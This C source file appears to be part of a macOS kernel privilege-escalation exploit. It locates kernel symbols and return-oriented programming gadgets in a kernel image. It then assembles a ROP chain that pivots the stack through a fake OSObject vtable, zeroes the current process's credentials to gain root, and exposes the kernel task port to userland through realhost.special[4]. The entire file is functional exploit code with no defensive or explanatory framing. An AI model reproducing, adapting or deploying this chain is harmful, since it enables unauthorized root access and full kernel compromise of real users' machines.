#include <stdint.h>             // uint64_t
#include <string.h>             // memmem

#include <mach/mach.h>

#include "common.h"             // LOG, ERR, FOREACH_CMD, seg_t, sym_t
#include "rop.h"

// Dirty hacks here to get the macros to search for
// mangled C++ symbols, but print unmangled names.

#define _ZTV8OSObject OSObject_vtab
#define _ZNK8OSObject13taggedReleaseEPKv OSObject_taggedRelease
#define _ZNK12OSSerializer9serializeEP11OSSerialize OSSerializer_serialize

#define STRINGIFY_EXPAND(s) #s

#define SYM(sym) \
do \
{ \
    if(strcmp(&strtab[symtab[i].nameoff], "_" #sym ) == 0) \
    { \
        LOG("%-30s: 0x%016llx", STRINGIFY_EXPAND(sym), symtab[i].addr); \
        rop->sym = symtab[i].addr; \
        break; \
    } \
} while(0)

#define GADGET(name) \
do \
{ \
    if(rop->name == 0) \
    { \
        char *_gadget = memmem(base, seg->filesize, gad__ ## name, sizeof( gad__ ## name )); \
        if(_gadget) \
        { \
            rop->name = _gadget - kernel + seg->vmaddr; \
            LOG("%-30s: 0x%016llx", #name, rop->name); \
        } \
    } \
} while(0)

#define ENSURE(sym) \
do \
{ \
    if(rop->sym == 0) \
    { \
        ERR("Failed to find %s", #sym); \
        return -1; \
    } \
} while(0)

#define LE32(ptr) (((ptr)[0] | ((ptr)[1] << 8) | ((ptr)[2] << 16) | ((ptr)[3] << 24)))

uint8_t gad__add__rdi__ecx[]                    = { 0x01, 0x0f, 0x97, 0xc3 };       // add [rdi], ecx; xchg eax, edi; ret;
uint8_t gad__mov_rdi__rax_8__call__rax_[]       = { 0x48, 0x8b, 0x78, 0x08, 0xff, 0x10 }; // mov rdi, [rax + 8]; call [rax];
uint8_t gad__mov_rsp_rsi_call_rdi[]             = { 0x48, 0x89, 0xf4, 0xff, 0xd7 }; // mov rsp, rsi; call rdi;
uint8_t gad__pop_rdi[]                          = { 0x5f, 0xc3 };                   // pop rdi; ret;
uint8_t gad__pop_rsi[]                          = { 0x5e, 0xc3 };                   // pop rsi; ret;
uint8_t gad__pop_rcx[]                          = { 0x59, 0xc3 };                   // pop rcx; ret;
uint8_t gad__push_rbp_mov_rax__rdi__pop_rbp[]   = { 0x55, 0x48, 0x89, 0xe5, 0x48, 0x8b, 0x07, 0x5d, 0xc3 }; // push rbp; mov rbp, rsp; mov rax, [rdi]; pop rbp; ret;
uint8_t gad__mov_rax__rdi__pop_rbp[]            = { 0x48, 0x8b, 0x07, 0x5d, 0xc3 }; // mov rax, [rdi]; pop rbp; ret;
uint8_t gad__mov__rdi__rax_pop_rbp[]            = { 0x48, 0x89, 0x07, 0x5d, 0xc3 }; // mov [rdi], rax; pop rbp; ret;
uint8_t gad__mov_rdi_rax_pop_rbp_jmp_rcx[]      = { 0x48, 0x89, 0xc7, 0x5d, 0xff, 0xe1 }; // mov rdi, rax; pop rbp; jmp rcx;
uint8_t gad__mov_rsi_rax_pop_rbp_jmp_rcx[]      = { 0x48, 0x89, 0xc6, 0x5d, 0xff, 0xe1 }; // mov rsi, rax; pop rbp; jmp rcx;
uint8_t gad__sub_rax_rdi_pop_rbp[]              = { 0x48, 0x29, 0xf8, 0x5d, 0xc3 }; // sub rax, rdi; pop rbp; ret;

int rop_gadgets(rop_t *rop, void *k)
{
    LOG("Looking for offsets and ROP gadgets...");
    char *kernel = k;

    FOREACH_CMD(kernel, cmd)
    {
        if(cmd->cmd == LC_SYMTAB)
        {
            struct symtab_command *stab = (struct symtab_command*)cmd;
            sym_t *symtab = (sym_t*)(kernel + stab->symoff);
            char *strtab = kernel + stab->stroff;
            for(uint32_t i = 0; i < stab->nsyms; ++i)
            {
                SYM(_ZTV8OSObject);
                SYM(_ZNK8OSObject13taggedReleaseEPKv);
                SYM(_ZNK12OSSerializer9serializeEP11OSSerialize);
                SYM(kOSBooleanTrue);
                SYM(current_proc);
                SYM(proc_ucred);
                SYM(posix_cred_get);
                SYM(bzero);
                SYM(task_reference);
                SYM(convert_task_to_port);
                SYM(kernel_task);
                SYM(realhost);
                SYM(mac_policy_list);
                SYM(hibernate_machine_init);
            }
            break;
        }
    }

    ENSURE(_ZTV8OSObject);
    ENSURE(_ZNK8OSObject13taggedReleaseEPKv);
    ENSURE(_ZNK12OSSerializer9serializeEP11OSSerialize);
    ENSURE(kOSBooleanTrue);
    ENSURE(current_proc);
    ENSURE(proc_ucred);
    ENSURE(posix_cred_get);
    ENSURE(bzero);
    ENSURE(task_reference);
    ENSURE(convert_task_to_port);
    ENSURE(kernel_task);
    ENSURE(realhost);
    ENSURE(mac_policy_list);
    ENSURE(hibernate_machine_init);

    FOREACH_CMD(kernel, cmd)
    {
        if(cmd->cmd == LC_SEGMENT_64)
        {
            seg_t *seg = (seg_t*)cmd;

            // ROP gadgets
            if((seg->initprot & VM_PROT_EXECUTE) != 0)
            {
                void *base = kernel + seg->fileoff;
                GADGET(add__rdi__ecx);
                GADGET(mov_rdi__rax_8__call__rax_);
                GADGET(mov_rsp_rsi_call_rdi);
                GADGET(pop_rdi);
                GADGET(pop_rsi);
                GADGET(pop_rcx);
                GADGET(push_rbp_mov_rax__rdi__pop_rbp);
                GADGET(mov_rax__rdi__pop_rbp);
                GADGET(mov__rdi__rax_pop_rbp);
                GADGET(mov_rdi_rax_pop_rbp_jmp_rcx);
                GADGET(mov_rsi_rax_pop_rbp_jmp_rcx);
                GADGET(sub_rax_rdi_pop_rbp);
            }

            // _hibernateStats
            uint64_t addr = rop->hibernate_machine_init;
            if(addr >= seg->vmaddr && addr < seg->vmaddr + seg->vmsize)
            {
                // Quick & dirty
                void *func = kernel + (addr + seg->fileoff - seg->vmaddr);
                char *load = memmem(func, 0x30, (uint8_t[]){ 0x48, 0x8d, 0x3d }, 3); // lea rdi, ...
                if(load)
                {
                    rop->_hibernateStats = (load - kernel + seg->vmaddr) + 7 +  // rip
                                           LE32(&load[3]);                      // offset
                    LOG("%-30s: 0x%016llx", "_hibernateStats", rop->_hibernateStats);
                }
            }

            // taggedRelease vtab offset
            addr = rop->OSObject_vtab;
            if(addr >= seg->vmaddr && addr < seg->vmaddr + seg->vmsize)
            {
                uint64_t *vtab = (uint64_t*)(kernel + (addr + seg->fileoff - seg->vmaddr));
                for(size_t i = 2; i < 0x30; ++i)
                {
                    if(vtab[i] == rop->OSObject_taggedRelease)
                    {
                        rop->taggedRelease_vtab_offset = (i - 2) * sizeof(*vtab);
                        LOG("%-30s: 0x%016llx", "taggedRelease vtab offset", rop->taggedRelease_vtab_offset);
                        break;
                    }
                }
            }
        }
    }

    ENSURE(_hibernateStats);
    ENSURE(taggedRelease_vtab_offset); // even this can never be 0, since destructor is first in vtab

    ENSURE(add__rdi__ecx);
    ENSURE(mov_rdi__rax_8__call__rax_);
    ENSURE(mov_rsp_rsi_call_rdi);
    ENSURE(pop_rdi);
    ENSURE(pop_rsi);
    ENSURE(pop_rcx);
    ENSURE(push_rbp_mov_rax__rdi__pop_rbp);
    ENSURE(mov_rax__rdi__pop_rbp);
    ENSURE(mov__rdi__rax_pop_rbp);
    ENSURE(mov_rdi_rax_pop_rbp_jmp_rcx);
    ENSURE(mov_rsi_rax_pop_rbp_jmp_rcx);
    ENSURE(sub_rax_rdi_pop_rbp);

    return 0;
}

#define PUSH(val) \
do \
{ \
    *buf = (val); \
    ++buf; \
    addr += s; \
} while(0)

// TODO: ipc_kobject_set(realhost.special[4]=ipc_port_alloc_special(ipc_space_kernel),IOMemoryDescriptor::withAddress(kernel_task,sizeof(task_t),kIODirectionInOut)->map(0)->getVirtualAddress(),IKOT_TASK);

void rop_chain(rop_t *rop, uint64_t *buf, uint64_t addr)
{
    LOG("Building ROP chain...");
    const size_t s = sizeof(*buf);

    // Employ our own stack; rax points exactly here:
    uint64_t after_vtab = addr + rop->taggedRelease_vtab_offset + s;
    PUSH(rop->OSSerializer_serialize);                  // gadget to load stack pivot, executed by fake vtab gadget
    PUSH(after_vtab - 2 * s);                           // rdi, first argument to OSSerializer::serialize
    for(size_t i = 2; i < rop->taggedRelease_vtab_offset / s; ++i)
    {
        PUSH(0xffffff80facade00 | i);                   // dummy
    }
    PUSH(rop->mov_rdi__rax_8__call__rax_);              // fake vtab gadget

    // OSSerializer::serialize will work with these:
    PUSH(rop->pop_rdi);                                 // what to run after stack pivot; need something that jumps over
                                                        // the return address pushed by "call rdi"
    PUSH(addr + 3 * s);                                 // address of stack
    PUSH(rop->mov_rsp_rsi_call_rdi);                    // stack pivot
    PUSH(0);                                            // stack pivot will write (futile) return address here

    // Save old stack location
    PUSH(rop->pop_rdi);                                 // load rdi
    PUSH(rop->kOSBooleanTrue);                          // rdi, will load address of *kOSBooleanTrue to rax
    uint64_t old_rbp_addr = addr;
    PUSH(rop->push_rbp_mov_rax__rdi__pop_rbp);          // rbp will be saved here

    // Need to dereference rax again; we move it to rdi for that
    PUSH(rop->pop_rcx);                                 // load next address to rcx
    PUSH(rop->mov_rax__rdi__pop_rbp);                   // rcx = dereferencing gadget
    PUSH(rop->mov_rdi_rax_pop_rbp_jmp_rcx);             // move rax to rdi and call rcx
    PUSH(0xffffff80dead1001);                           // dummy rbp
    PUSH(0xffffff80dead1002);                           // another dummy rbp

    // Get root: bzero(posix_cred_get(proc_ucred(current_proc())), 12)
    PUSH(rop->current_proc);
    // Move rax to rdi
    PUSH(rop->pop_rcx);
    PUSH(rop->proc_ucred);                              // rcx, next address
    PUSH(rop->mov_rdi_rax_pop_rbp_jmp_rcx);             // move rax to rdi and call rcx
    PUSH(0xffffff80dead1005);                           // dummy rbp
    // Move rax to rdi
    PUSH(rop->pop_rcx);
    PUSH(rop->posix_cred_get);                          // rcx, next address
    PUSH(rop->mov_rdi_rax_pop_rbp_jmp_rcx);             // move rax to rdi and call rcx
    PUSH(0xffffff80dead1006);                           // dummy rbp
    // Move rax to rdi
    PUSH(rop->pop_rcx);
    PUSH(rop->pop_rsi);                                 // rcx, next address
    PUSH(rop->mov_rdi_rax_pop_rbp_jmp_rcx);             // move rax to rdi and call rcx
    PUSH(0xffffff80dead1007);                           // dummy rbp
    // Second argument to bzero
    PUSH(3 * sizeof(uint32_t));                         // rsi
    PUSH(rop->bzero);

    // bring kernel task port to userland
    // task_reference(kernel_task);
    PUSH(rop->pop_rdi);                                 // load *kernel_task to rdi
    PUSH(rop->kernel_task);                             // rdi
    PUSH(rop->mov_rax__rdi__pop_rbp);                   // dereference
    PUSH(0xffffff80dead1008);                           // dummy rbp
    PUSH(rop->pop_rcx);
    PUSH(rop->task_reference);                          // rcx, next address
    PUSH(rop->mov_rdi_rax_pop_rbp_jmp_rcx);             // move rax to rdi and call rcx
    PUSH(0xffffff80dead1009);                           // dummy rbp

    // realhost.special[4] = convert_task_to_port
    PUSH(rop->pop_rdi);                                 // load *kernel_task to rdi
    PUSH(rop->kernel_task);                             // rdi
    PUSH(rop->mov_rax__rdi__pop_rbp);                   // dereference
    PUSH(0xffffff80dead100a);                           // dummy rbp
    PUSH(rop->pop_rcx);
    PUSH(rop->convert_task_to_port);                    // rcx, next address
    PUSH(rop->mov_rdi_rax_pop_rbp_jmp_rcx);             // move rax to rdi and call rcx
    PUSH(0xffffff80dead100b);                           // dummy rbp
    PUSH(rop->pop_rdi);                                 // load address of realhost.special[4] to rdi
    PUSH(rop->realhost + 0x30);                         // rdi
    PUSH(rop->mov__rdi__rax_pop_rbp);                   // store to realhost.special[4]
    PUSH(0xffffff80dead100c);                           // dummy rbp

    // Return to original stack
    PUSH(rop->pop_rdi);                                 // load address where rbp was saved
    PUSH(old_rbp_addr);                                 // old rbp address
    PUSH(rop->mov_rax__rdi__pop_rbp);                   // dereference to rax
    PUSH(0xffffff80dead100d);                           // dummy rbp
    PUSH(rop->pop_rdi);                                 // load OSArray::flushCollection stack size to rdi
    PUSH(0x28);                                         // OSArray::flushcollection stack size (4 regs + ret addr)
    PUSH(rop->sub_rax_rdi_pop_rbp);                     // calculate old rsp from old rbp
    PUSH(0xffffff80dead100e);                           // dummy rbp

    PUSH(rop->pop_rcx);                                 // load next address
    PUSH(rop->pop_rdi);                                 // rcx, next address
    PUSH(rop->mov_rsi_rax_pop_rbp_jmp_rcx);             // move rax (old rsp) to rsi and call rcx
    PUSH(0xffffff80dead100f);                           // dummy rbp
    // rcx (= pop_rdi) is called here:
    PUSH(rop->pop_rdi);                                 // rdi, address of something that jumps over 1 stack value
    PUSH(rop->mov_rsp_rsi_call_rdi);                    // goodbye

    // We should never get here, but just in case...
    PUSH(0xffffff80deadbeef);
    PUSH(0xffffff80deadf00d);
    PUSH(0xffffff80deadc0de);
}
